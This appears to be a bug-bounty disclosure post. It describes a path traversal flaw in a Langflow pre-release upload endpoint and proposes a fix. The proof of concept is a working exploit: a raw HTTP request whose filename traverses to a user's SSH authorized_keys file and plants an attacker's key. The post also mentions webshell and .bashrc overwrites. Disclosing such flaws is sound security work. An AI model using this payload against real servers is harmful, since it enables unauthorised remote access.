---
layout: post
title:  "Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release"
date:  2024-05-26 10:31:06 +0800
categories: file-overwrite
---

## Name

> Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in Langflow Pre-release.


## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Version

> Pre-release version: 1.0 Alpha - v1.0.0a37

## Description

The post `/upload/{flow_id}` endpoint in the Langflow [upload_file](https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47) is vulnerable to a path traversal vulnerability through the `filename` parameter which allows the uploading of arbitrary files. The `filename` is then directly append to a directory path [without sanitized](https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34) and the file content is writen to dest location. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.

The vulnerable function [`save_file`](https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34):
```
async def save_file(self, flow_id: str, file_name: str, data: bytes):
        folder_path = self.data_dir / flow_id
        folder_path.mkdir(parents=True, exist_ok=True)
        file_path = folder_path / file_name

        try:
            with open(file_path, "wb") as f:
                f.write(data)
            logger.info(f"File {file_name} saved successfully in flow {flow_id}.")
        except Exception as e:
            logger.error(f"Error saving file {file_name} in flow {flow_id}: {e}")
            raise e
```

## Proof of Concept

In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the `authorized_keys` file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ....

We proof this vulnerability by logging into the `kali` user running the langflow python API and checking that at this moment the `/home/kali/.ssh/authorized_keys` file does not exist.

```
kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
cat: /home/kali/.ssh/authorized_keys: No such file or directory
```

An attacker can now send the following request to the webserver. This request will upload the attacker's public RSA key to the `authorized_keys` file.

We start a simple server using tutorial from [https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation](https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation). Note that we use pre-release versoin:

```
# Install the pre-release version
python -m pip install langflow --pre --force-reinstall
```
Start web interface, the default port is `7860`

```
python -m langflow run
```

Then open the Langflow web interface in browser, create a new project and in the project add a file component, click the file upload button, select random text file with burpsuite intercepting the upload request. We can see the file name and file content in the multipart request body. 

![file-component](/assets/images/bughunter/langflow/file-component.png)

![file-upload](/assets/images/bughunter/langflow/file-upload.png)


Change the multipart `filename` to `../../../../../../../../../home/kali/.ssh/authorized_keys` and file content to our `authorized_keys` content. Repeat the upload request.

```
POST http://127.0.0.1:7860/api/v1/files/upload/7e774022-0991-47f7-83a1-ef127d439755 HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
Cache-Control: no-cache
Connection: close
Cookie: access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
Origin: http://127.0.0.1:7860
Pragma: no-cache
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Host: 127.0.0.1:7860
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=--------------------------636165805457578805665550
Content-Length: 647

----------------------------636165805457578805665550
Content-Disposition: form-data; name="file"; filename="../../../../../home/kali/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
----------------------------636165805457578805665550--
```

The response indicates success with the uploaded file path.

```
HTTP/1.1 201 Created
Connection: close
Content-Length: 146
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://127.0.0.1:7860
Content-Type: application/json
Date: Sun, 26 May 2024 03:48:37 GMT
Server: uvicorn
Vary: Origin

{"flowId":"7e774022-0991-47f7-83a1-ef127d439755","file_path":"7e774022-0991-47f7-83a1-ef127d439755/../../../../../home/kali/.ssh/authorized_keys"}
```

We can verify the success by again checking the `/home/kali/.ssh/authorized_keys` file.

```
kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
```

## Fix

Use [UUID instead of origin file name to store the file](https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47):

```
@router.post("/upload/{flow_id}", status_code=HTTPStatus.CREATED)
async def upload_file(
    file: UploadFile,
    flow_id: UUID = Depends(get_flow_id),
    storage_service: StorageService = Depends(get_storage_service),
):
    try:
        flow_id_str = str(flow_id)
        file_content = await file.read()
        # fix the path travesal problem
        file_name = hashlib.sha256(file_content).hexdigest()
        folder = flow_id_str
        await storage_service.save_file(flow_id=folder, file_name=file_name, data=file_content)
        return UploadFileResponse(flowId=flow_id_str, file_path=f"{folder}/{file_name}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
```

## Impact

This vulnerability can have severe consequences. This section will highlight some tangible impact.


### SSH Access

On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.

### Web Servers

On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)

### Any bounty

Can I ask for a bug bounty award or a CVE id for this bug? Thank you very much!

## Reference

[https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e](https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e)

## Occurrences

[https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47](https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47)

[https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34](https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34)
